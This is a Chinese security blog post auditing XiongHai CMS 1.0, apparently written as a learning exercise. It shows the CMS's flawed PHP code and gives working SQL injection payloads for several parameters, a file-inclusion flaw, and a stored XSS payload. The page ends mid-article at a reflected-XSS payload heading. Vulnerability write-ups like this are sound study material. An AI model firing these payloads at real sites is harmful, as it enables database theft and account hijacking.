@@ -1,0 +1,1766 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="php代码审计初试-熊海CMS1-0, HTML,CSS,JavaScript,php,python,linux,mysql等">
+    <meta name="description" content="专注web，分享生活，分享知识">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>php代码审计初试-熊海CMS1-0 | Script kiddie&#39;s life</title>
+    <link rel="icon" type="image/jpeg" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/favicon.jpg">
+
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/css/my.css">
+
+    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/jquery/jquery.min.js"></script>
+    
+<style type="text/css" lang="css">
+    #loading-container{
+        position: fixed;
+        top: 0;
+        left: 0;
+        min-height: 100vh;
+        width: 100vw;
+        z-index: 9999;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        background: #FFF;
+        text-align: center;
+        /* loader页面消失采用渐隐的方式*/
+        -webkit-transition: opacity 1s ease;
+        -moz-transition: opacity 1s ease;
+        -o-transition: opacity 1s ease;
+        transition: opacity 1s ease;
+    }
+    .loading-image{
+        width: 120px;
+        height: 50px;
+        transform: translate(-50%);
+    }
+
+    .loading-image div:nth-child(2) {
+        -webkit-animation: pacman-balls 1s linear 0s infinite;
+        animation: pacman-balls 1s linear 0s infinite
+    }
+
+    .loading-image div:nth-child(3) {
+        -webkit-animation: pacman-balls 1s linear .33s infinite;
+        animation: pacman-balls 1s linear .33s infinite
+    }
+
+    .loading-image div:nth-child(4) {
+        -webkit-animation: pacman-balls 1s linear .66s infinite;
+        animation: pacman-balls 1s linear .66s infinite
+    }
+
+    .loading-image div:nth-child(5) {
+        -webkit-animation: pacman-balls 1s linear .99s infinite;
+        animation: pacman-balls 1s linear .99s infinite
+    }
+
+   .loading-image div:first-of-type {
+        width: 0;
+        height: 0;
+        border: 25px solid #49b1f5;
+        border-right-color: transparent;
+        border-radius: 25px;
+        -webkit-animation: rotate_pacman_half_up .5s 0s infinite;
+        animation: rotate_pacman_half_up .5s 0s infinite;
+    }
+    .loading-image div:nth-child(2) {
+        width: 0;
+        height: 0;
+        border: 25px solid #49b1f5;
+        border-right-color: transparent;
+        border-radius: 25px;
+        -webkit-animation: rotate_pacman_half_down .5s 0s infinite;
+        animation: rotate_pacman_half_down .5s 0s infinite;
+        margin-top: -50px;
+    }
+    @-webkit-keyframes rotate_pacman_half_up {0% {transform: rotate(270deg)}50% {transform: rotate(1turn)}to {transform: rotate(270deg)}}
+
+    @keyframes rotate_pacman_half_up {0% {transform: rotate(270deg)}50% {transform: rotate(1turn)}to {transform: rotate(270deg)}}
+
+    @-webkit-keyframes rotate_pacman_half_down {0% {transform: rotate(90deg)}50% {transform: rotate(0deg)}to {transform: rotate(90deg)}}
+
+    @keyframes rotate_pacman_half_down {0% {transform: rotate(90deg)}50% {transform: rotate(0deg)}to {transform: rotate(90deg)}}
+
+    @-webkit-keyframes pacman-balls {75% {opacity: .7}to {transform: translate(-100px, -6.25px)}}
+
+    @keyframes pacman-balls {75% {opacity: .7}to {transform: translate(-100px, -6.25px)}}
+
+
+    .loading-image div:nth-child(3),
+    .loading-image div:nth-child(4),
+    .loading-image div:nth-child(5),
+    .loading-image div:nth-child(6){
+        background-color: #49b1f5;
+        width: 15px;
+        height: 15px;
+        border-radius: 100%;
+        margin: 2px;
+        width: 10px;
+        height: 10px;
+        position: absolute;
+        transform: translateY(-6.25px);
+        top: 25px;
+        left: 100px;
+    }
+    .loading-text{
+        margin-bottom: 20vh;
+        text-align: center;
+        color: #2c3e50;
+        font-size: 2rem;
+        box-sizing: border-box;
+        padding: 0 10px;
+        text-shadow: 0 2px 10px rgba(0,0,0,0.2);
+    }
+    @media only screen and (max-width: 500px) {
+         .loading-text{
+            font-size: 1.5rem;
+         }
+    }
+    .fadeout {
+        opacity: 0;
+        filter: alpha(opacity=0);
+    }
+    /* logo出现动画 */
+    @-webkit-keyframes fadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{opacity:1;-webkit-transform:none;transform:none}}
+    @keyframes fadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-100%,0);}}
+ </style>
+ <script>
+(function () {
+    const loaded = function(){
+       setTimeout(function(){
+            const loader = document.getElementById("loading-container");
+            loader.className="fadeout" ;//使用渐隐的方法淡出loading page
+            // document.getElementById("body-wrap").style.display="flex";
+            setTimeout(function(){
+                loader.style.display="none";
+            },1000); 
+        },1000);//强制显示loading page 1s  
+    };
+    loaded();
+})()
+ </script><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Script kiddie's life" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><style type="text/css" lang="css">
+    #loading-container{
+        position: fixed;
+        top: 0;
+        left: 0;
+        min-height: 100vh;
+        width: 100vw;
+        z-index: 9999;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        background: #FFF;
+        text-align: center;
+        /* loader页面消失采用渐隐的方式*/
+        -webkit-transition: opacity 1s ease;
+        -moz-transition: opacity 1s ease;
+        -o-transition: opacity 1s ease;
+        transition: opacity 1s ease;
+    }
+    .loading-image{
+        width: 120px;
+        height: 50px;
+        transform: translate(-50%);
+    }
+
+    .loading-image div:nth-child(2) {
+        -webkit-animation: pacman-balls 1s linear 0s infinite;
+        animation: pacman-balls 1s linear 0s infinite
+    }
+
+    .loading-image div:nth-child(3) {
+        -webkit-animation: pacman-balls 1s linear .33s infinite;
+        animation: pacman-balls 1s linear .33s infinite
+    }
+
+    .loading-image div:nth-child(4) {
+        -webkit-animation: pacman-balls 1s linear .66s infinite;
+        animation: pacman-balls 1s linear .66s infinite
+    }
+
+    .loading-image div:nth-child(5) {
+        -webkit-animation: pacman-balls 1s linear .99s infinite;
+        animation: pacman-balls 1s linear .99s infinite
+    }
+
+   .loading-image div:first-of-type {
+        width: 0;
+        height: 0;
+        border: 25px solid #49b1f5;
+        border-right-color: transparent;
+        border-radius: 25px;
+        -webkit-animation: rotate_pacman_half_up .5s 0s infinite;
+        animation: rotate_pacman_half_up .5s 0s infinite;
+    }
+    .loading-image div:nth-child(2) {
+        width: 0;
+        height: 0;
+        border: 25px solid #49b1f5;
+        border-right-color: transparent;
+        border-radius: 25px;
+        -webkit-animation: rotate_pacman_half_down .5s 0s infinite;
+        animation: rotate_pacman_half_down .5s 0s infinite;
+        margin-top: -50px;
+    }
+    @-webkit-keyframes rotate_pacman_half_up {0% {transform: rotate(270deg)}50% {transform: rotate(1turn)}to {transform: rotate(270deg)}}
+
+    @keyframes rotate_pacman_half_up {0% {transform: rotate(270deg)}50% {transform: rotate(1turn)}to {transform: rotate(270deg)}}
+
+    @-webkit-keyframes rotate_pacman_half_down {0% {transform: rotate(90deg)}50% {transform: rotate(0deg)}to {transform: rotate(90deg)}}
+
+    @keyframes rotate_pacman_half_down {0% {transform: rotate(90deg)}50% {transform: rotate(0deg)}to {transform: rotate(90deg)}}
+
+    @-webkit-keyframes pacman-balls {75% {opacity: .7}to {transform: translate(-100px, -6.25px)}}
+
+    @keyframes pacman-balls {75% {opacity: .7}to {transform: translate(-100px, -6.25px)}}
+
+
+    .loading-image div:nth-child(3),
+    .loading-image div:nth-child(4),
+    .loading-image div:nth-child(5),
+    .loading-image div:nth-child(6){
+        background-color: #49b1f5;
+        width: 15px;
+        height: 15px;
+        border-radius: 100%;
+        margin: 2px;
+        width: 10px;
+        height: 10px;
+        position: absolute;
+        transform: translateY(-6.25px);
+        top: 25px;
+        left: 100px;
+    }
+    .loading-text{
+        margin-bottom: 20vh;
+        text-align: center;
+        color: #2c3e50;
+        font-size: 2rem;
+        box-sizing: border-box;
+        padding: 0 10px;
+        text-shadow: 0 2px 10px rgba(0,0,0,0.2);
+    }
+    @media only screen and (max-width: 500px) {
+         .loading-text{
+            font-size: 1.5rem;
+         }
+    }
+    .fadeout {
+        opacity: 0;
+        filter: alpha(opacity=0);
+    }
+    /* logo出现动画 */
+    @-webkit-keyframes fadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{opacity:1;-webkit-transform:none;transform:none}}
+    @keyframes fadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-100%,0);}}
+ </style>
+ <script>
+(function () {
+    const loaded = function(){
+       setTimeout(function(){
+            const loader = document.getElementById("loading-container");
+            loader.className="fadeout" ;//使用渐隐的方法淡出loading page
+            // document.getElementById("body-wrap").style.display="flex";
+            setTimeout(function(){
+                loader.style.display="none";
+            },1000); 
+        },1000);//强制显示loading page 1s  
+    };
+    loaded();
+})()
+ </script></head>
+
+
+
+ <div id="loading-container">
+     <p class="loading-text">玩命加载中 . . . </p> 
+     <div class="loading-image">
+         <div></div>
+         <div></div>
+         <div></div>
+         <div></div> 
+         <div></div>
+     </div>
+ </div><body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/medias/logo.jpg" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Script kiddie's life</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>文章分类</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/categories/web%E5%AE%89%E5%85%A8">
+          
+          <span>web安全</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F">
+          
+          <span>内网渗透</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/CTF">
+          
+          <span>CTF</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/python">
+          
+          <span>python</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/linux">
+          
+          <span>linux</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8">
+          
+          <span>无线安全</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-bicycle" style="zoom: 0.6;"></i>
+      
+      <span>各种折腾</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/categories/%E5%8D%9A%E5%AE%A2">
+          
+          <span>博客</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/qq%E6%9C%BA%E5%99%A8%E4%BA%BA">
+          
+          <span>qq机器人</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E5%B8%B8">
+          
+          <span>个人日常</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-sitemap" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/tags">
+          
+          <i class="fas fa-tags" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>文章标签</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/archives">
+          
+          <i class="fas fa-archive" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>时间轴</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于我</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-envelope" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/medias/logo.jpg" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Script kiddie's life</div>
+        <div class="logo-desc">
+            
+            专注web，分享生活，分享知识
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-bookmark"></i>
+			
+			文章分类
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/categories/web%E5%AE%89%E5%85%A8 " style="margin-left:75px";>
+				  
+		          <span>web安全</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F " style="margin-left:75px";>
+				  
+		          <span>内网渗透</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/CTF " style="margin-left:75px";>
+				  
+		          <span>CTF</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/python " style="margin-left:75px";>
+				  
+		          <span>python</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/linux " style="margin-left:75px";>
+				  
+		          <span>linux</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8 " style="margin-left:75px";>
+				  
+		          <span>无线安全</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-bicycle"></i>
+			
+			各种折腾
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/categories/%E5%8D%9A%E5%AE%A2 " style="margin-left:75px";>
+				  
+		          <span>博客</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/qq%E6%9C%BA%E5%99%A8%E4%BA%BA " style="margin-left:75px";>
+				  
+		          <span>qq机器人</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E5%B8%B8 " style="margin-left:75px";>
+				  
+		          <span>个人日常</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-sitemap"></i>
+			
+			归档
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>   
+				
+                  <a href="/tags " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-tags" style="position: absolute;left:50px" ></i>
+			      
+		          <span>文章标签</span>
+                  </a>
+                </li>
+              
+                <li>   
+				
+                  <a href="/archives " style="margin-left:75px";>
+				  
+				   <i class="fa fas fa-archive" style="position: absolute;left:50px" ></i>
+			      
+		          <span>时间轴</span>
+                  </a>
+                </li>
+               
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于我
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-envelope"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://Lmg66.github.io/images/pasted-382.png')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">php代码审计初试-熊海CMS1-0</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                                <span class="chip bg-color">代码审计</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                代码审计
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-03-17
+                </div>
+                
+
+                
+
+                
+
+                
+
+                 <span id="busuanzi_container_site_pv" style='display:none'></span> <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp; <span id="busuanzi_value_page_pv" ></span> 
+
+            </div>
+
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h3 id="源码下载"><a href="#源码下载" class="headerlink" title="源码下载"></a>源码下载</h3><p>站长下载:<a href="http://down.chinaz.com/soft/36930.htm" target="_blank" rel="noopener">http://down.chinaz.com/soft/36930.htm</a></p>
+<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>VSCode phpstudy2018 php5.6.27</p>
+<p>配置方法:国光大佬<a href="https://www.sqlsec.com/2020/09/xdebug.html" target="_blank" rel="noopener">https://www.sqlsec.com/2020/09/xdebug.html</a></p>
+<h3 id="CMS目录"><a href="#CMS目录" class="headerlink" title="CMS目录"></a>CMS目录</h3><pre><code>admin             --后台文件夹
+css               --css文件夹
+files             --存放网站的各种功能页面文件夹
+images            --存放图片文件夹
+inc               --配置文件夹
+install           --网站安装文件夹
+seacmseditor      --网站的编辑器文件夹
+template          --模板文件夹
+upload            --存放网站上传的文件
+index.php         --网站入口</code></pre><h3 id="入口分析"><a href="#入口分析" class="headerlink" title="入口分析"></a>入口分析</h3><p>index.php</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token comment" spellcheck="true">//单一入口模式</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//关闭错误显示</span>
+<span class="token variable">$file</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//接收文件名</span>
+<span class="token variable">$action</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token operator">==</span><span class="token string">''</span><span class="token operator">?</span><span class="token string">'index'</span><span class="token punctuation">:</span><span class="token variable">$file</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//判断为空或者等于index</span>
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'files/'</span><span class="token punctuation">.</span><span class="token variable">$action</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//载入相应文件</span>
+<span class="token delimiter">?></span></code></pre>
+<p>get接收r，包含r名的php文件，没有经过过滤可以跨目录包含任意php文件</p>
+<p>写一个phpinfo文件包含尝试、<br><img src="/images/pasted-342.png" alt="upload successful"></p>
+<p>继续查看files/index.php</p>
+<p><img src="/images/pasted-343.png" alt="upload successful"><br>34行</p>
+<pre class=" language-php"><code class="language-php"><span class="token markup">&lt;a href="?r=content&amp;cid=<span class="token prolog">&lt;?php echo $toutiaoimg['id']?></span></span>"</code></pre>
+<p>跟进一下</p>
+<p><img src="/images/pasted-344.png" alt="upload successful"><br>get接收了cid，经过addslashes函数，转义了单引号（’）、双引号（”）、反斜线（\）与 NUL（NULL 字符）<br><img src="/images/pasted-345.png" alt="upload successful"><br>绕过addslashes()方法</p>
+<p>1.没有使用单引号或双引号闭合，直接注入己可</p>
+<p>2.宽字节注入</p>
+<p>%df%27<br>gbk是多字节编码，他认为两个字节代表一个汉字，所以%df和后面的\也就是%5c变成了一个汉字“運”，而’逃逸了出来</p>
+<p>3.经过编码后转义在解码插入sql语句</p>
+<p><img src="/images/pasted-346.png" alt="upload successful"><br>查看编码不是gbk，放弃宽字节注入</p>
+<p>发现19行的查询id并没有进行单引号或双引号闭合，可以注入,而且可回显，直接报错注入</p>
+<pre><code>?r=content&amp;cid=1 or(updatexml(1,concat(0x7e,(select%20database()),0x7e),1))</code></pre><p><img src="/images/pasted-348.png" alt="upload successful"><br><img src="/images/pasted-347.png" alt="upload successful"></p>
+<p>继续看154有留言功能</p>
+<p><img src="/images/pasted-349.png" alt="upload successful"></p>
+<p>跟进一下(content.php后面也没传参代码)</p>
+<p>先设置了session，对传入的type进行了addslashes()其他的参数暂时并未转义</p>
+<p>进行了验证码的判断</p>
+<pre><code>if(strtolower($_POST[&#39;randcode&#39;])&lt;&gt;addslashes($_SESSION[&#39;randcode&#39;])){ 
+echo &quot;&lt;Script language=JavaScript&gt;alert(&#39;抱歉，验证码错误，请重新输入！&#39;);history.back();&lt;/Script&gt;&quot;;
+exit; 
+}</code></pre><p>然后是对是否为空的判断<br>35~38是对判断评论是否含有GBK中文编码汉字</p>
+<pre><code>if (!preg_match(&quot;/([\x81-\xfe][\x40-\xfe])/&quot;, $content, $match)) {
+echo &quot;&lt;Script language=JavaScript&gt;alert(&#39;亲，再说点别的了吧？&#39;);history.back();&lt;/Script&gt;&quot;;
+exit;    
+}</code></pre><p>48行</p>
+<pre><code>$content= addslashes(strip_tags($content));//过滤HTML</code></pre><p>strip_tags从字符串中去除 HTML 和 PHP 标记<br>又进行了addslashes转义</p>
+<p>个人目前觉得没问题</p>
+<p>66行，发现mail没用经过任何过滤 拼接到查询语句中<br>存在sql注入，闭合标签，报错注入</p>
+<pre><code>$query = &quot;SELECT * FROM interaction WHERE( mail = &#39;$mail&#39;)&quot;;</code></pre><p>payload:</p>
+<pre><code>&#39;) and updatexml(1,concat(0x7e,user()),1)#</code></pre><p>继续向后看，根据配置设置不同的参数，暂时不管</p>
+<p>121行~147行进行将传参放入数据库中,发现很多参数没用经过过滤存在存储xss，sql注入<br>比如name参数<br>存储xss,发现前台输出评论时也没经过任何过滤</p>
+<p><img src="/images/pasted-359.png" alt="upload successful"><br>后台输出时候也没经过过滤，所有可以打后台</p>
+<p><img src="/images/pasted-360.png" alt="upload successful"><br>payload:</p>
+<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p><img src="/images/pasted-351.png" alt="upload successful"><br>sql报错注入,因为有回显</p>
+<pre><code>&#39; and updatexml(1,concat(0x7e,user()),1) and &#39;</code></pre><p>拼接后执行的语句</p>
+<pre><code>&quot;INSERT INTO interaction (
+type,
+xs,
+cid,
+name,
+mail,
+url,
+touxiang,
+shebei,
+ip,
+content,
+tz,
+date
+) VALUES (
+&#39;1&#39;,
+&#39;1&#39;,
+&#39;5&#39;,
+&#39;&#39; and updatexml(1,concat(0x7e,user()),1) and &#39;&#39;,
+&#39;name&#39;,
+&#39;http://name&#39;,
+&#39;81&#39;,
+&#39;PC&#39;,
+&#39;127.0.0.1&#39;,
+&#39;name sql 测试&#39;,
+&#39;1&#39;,
+now()
+)&quot;</code></pre><p>通过引号的闭合执行语句</p>
+<p>继续<br>if ($pltz==1)执行下面的代码,发现中间sql的查询<br><img src="/images/pasted-352.png" alt="upload successful"><br>而且cid的变量未经过过滤</p>
+<p>查看如何让pltz==1</p>
+<p><img src="/images/pasted-353.png" alt="upload successful"><br>需要站长开启，新留言评论通知，我们开启尝试一下<br><img src="/images/pasted-354.png" alt="upload successful"><br>报错注入,同样有回显<br>payload(type要等于comment或download,这样type才能等于1or3<br>才能执行sql语句):</p>
+<pre><code>5)%20and%20updatexml(1,concat(0x7e,user()),1)#</code></pre><p><img src="/images/pasted-355.png" alt="upload successful"></p>
+<h3 id="继续看file下的文件"><a href="#继续看file下的文件" class="headerlink" title="继续看file下的文件"></a>继续看file下的文件</h3><h4 id="about-php-contact-php-同理"><a href="#about-php-contact-php-同理" class="headerlink" title="about.php contact.php 同理"></a>about.php contact.php 同理</h4><p><img src="/images/pasted-357.png" alt="upload successful"><br>contact.php还存在反射形xss<br><img src="/images/pasted-365.png" alt="upload successful"><br>payload:</p>
